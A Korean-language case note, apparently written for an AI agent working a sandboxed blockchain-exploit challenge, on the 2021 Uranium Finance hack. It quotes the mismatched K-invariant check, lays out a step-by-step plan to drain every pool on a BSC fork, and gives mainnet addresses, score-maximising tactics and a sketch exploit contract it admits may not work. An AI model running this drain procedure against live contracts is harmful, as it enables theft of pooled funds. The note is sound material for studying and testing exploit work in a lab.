# Case: Uranium Finance (BSC, 2021)

## Overview

- **체인**: Binance Smart Chain
- **피해 금액**: ~$50M
- **공격 유형**: AMM K-invariant 검증 상수 잘못 → 트레이드 시 불변량 검증이 100배 느슨
- **참조**: https://rekt.news/uranium-rekt/

## 프로토콜 구조

Uranium은 Uniswap V2 fork. AMM `swap()` 함수의 K-invariant 검증 부분에서 리팩토링 중 상수를 잘못 박음:

### Uniswap V2 표준 (정상)
```solidity
uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));  // 0.3% fee
uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));
require(
    balance0Adjusted.mul(balance1Adjusted) >= 
    uint(_reserve0).mul(_reserve1).mul(1000**2),
    'UniswapV2: K'
);
```
- 좌변 `balance*1000` 스케일, 우변 `reserve² × 1000**2` 스케일 — 양변 단위 일치

### Uranium의 잘못된 패치 (실제 배포 코드, Immunefi 1차 출처 검증)
```solidity
uint balance0Adjusted = balance0.mul(10000).sub(amount0In.mul(16));  // 1000→10000, fee 3→16
uint balance1Adjusted = balance1.mul(10000).sub(amount1In.mul(16));  // (10000-16)/10000 = 0.16% fee
require(
    balance0Adjusted.mul(balance1Adjusted) >= 
    uint(_reserve0).mul(_reserve1).mul(1000**2),   // ← 1000**2 그대로 (여기가 버그)
    'UraniumSwap: K'
);
```
- **좌변**: 스케일을 `1000 → 10000`, 수수료 계수를 `3 → 16`으로 변경 (0.3% → 0.16%)
- **우변**: `1000**2` 그대로. 리팩토링 시 `10000**2`로 같이 바꿨어야 하지만 **방치됨**
- 결과: 좌변은 `(balance × 10000)² ≈ balance² × 10⁸`, 우변은 `reserve² × 10⁶` → **좌변이 약 100배 더 큼** → `>=` 체크가 너무 쉽게 통과 → invariant 검증이 완전히 깨짐

**참고**: 이전 버전의 이 문서는 좌우를 뒤집어 "우변이 10000**2로 바뀌고 좌변이 1000 그대로"라고 적었으나, Immunefi의 Uranium Heist PoC 분석에서 실제 배포 코드를 확인한 결과 위의 설명이 올바르다.

## 공격 메커니즘

K-invariant가 100배 느슨해졌다는 건:
- 정상 swap에서 1 BNB 넣고 1.99 BUSD 받았다면
- Uranium에서는 1 BNB 넣고 ~199 BUSD까지 받아갈 수 있음 (실제는 reserve 한도 내에서)
- 즉 풀의 거의 모든 토큰을 한 번에 swap으로 가져갈 수 있음

### 단일 트랜잭션 공격
1. 공격자: pair에 작은 양의 token0 input
2. `swap(amount0Out, amount1Out, to, data)` 호출. amount0Out과 amount1Out을 reserve의 거의 전체로 지정
3. 검증이 깨졌으니 통과
4. 풀이 비워짐

**flash loan도 거의 불요** — 풀의 양 토큰을 동시에 빼냄. 다만 swap 함수 시그니처가 amount0Out/amount1Out을 동시에 받을 수 있어서 한 번 호출에 양쪽 다 빼냄.

## ch1 챌린지 적용

이 챌린지는 BSC fork. 공격 절차:

1. **Recon**:
   - chain_id 확인 (56 = BSC)
   - Uranium router/factory 주소 식별
   - 각 pair의 reserve 확인 (큰 풀부터)
2. **Pair 별로 swap 호출**:
   - 작은 양의 token0 input
   - amount0Out + amount1Out를 reserve의 99%
   - 받은 토큰들을 본인 EOA로
3. **Native 변환**:
   - 받은 토큰들 중 BNB가 아닌 것은 PancakeSwap 또는 같은 풀에서 BNB로 swap
   - WBNB는 unwrap

### 핵심 컨트랙트 주소 (메인넷, 참고용)
- Uranium Factory: `0xA943eA143cd7E79806d670f4a7cf08F8922a454F`
- 주요 pair들은 factory.allPairs() 또는 PairCreated 이벤트로 enumerate

### Fork block
공격은 2021-04-28경 발생. fork block은 챌린지 RPC가 정해줌. `cast block-number --rpc-url $RPC_CH1_URANIUM`로 확인.

## 점수 최적화

- 기본값: **모든 페어 드레인 + 모든 ERC20을 BNB로 환전** (과제 요구: vault 0 만들기)
- log1p 점수 곡선상 1-3개 풀 드레인만으로 score_est 만점 찍힐 수 있으나, 실제 점수는 minmax 상대평가라 타인이 더 많이 털면 밀려남 → 안전하게 전부
- 순서는 reserve 큰 페어부터 (실패 시 가스 적게 날림)
- 작은 풀도 BUSD+X 2홉 환전으로 BNB 편입 (개당 ~200k gas, 비용 무시 가능)

## A/B/C/D 분류 요약

- A: K-invariant 상수 오류 (단일 root cause)
- B: 정상 Uniswap V2 K 검증
- C: 없음
- D: gas, swap fee 무시할 수준

## 예상 PoC 구조

```solidity
contract UraniumExploit {
    function exploit(address pair) external {
        IUniswapV2Pair p = IUniswapV2Pair(pair);
        (uint112 r0, uint112 r1, ) = p.getReserves();
        
        // 1 wei input으로 reserve 99% 빼기
        // 사실 amount0In = 0, amount1In = 0 으로 호출하고 싶지만 그러면 swap이 의미 없음
        // dust input + huge output
        IERC20 t0 = IERC20(p.token0());
        t0.transfer(pair, 1);  // dust input
        
        p.swap(uint(r0)*99/100, uint(r1)*99/100, address(this), "");
        // 깨진 K 검증을 통과
    }
}
```

실제로는 K 검증의 정확한 식을 보고 maximum extractable amount 계산해야 함. dust 1 wei로는 `balance0Adjusted * balance1Adjusted` 가 매우 작아져서 검증 못 통과할 수도. 실험 필요.

## Codex 위임 시 주의

- BSC fork이므로 ETH가 아니라 BNB가 native
- `native_conversion.skill.md` 의 BNB 섹션 참조
- WBNB 주소: `0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c`
- PancakeSwap V2 router (있다면): `0x10ED43C718714eb63d5aA57B78B54704E256024E`
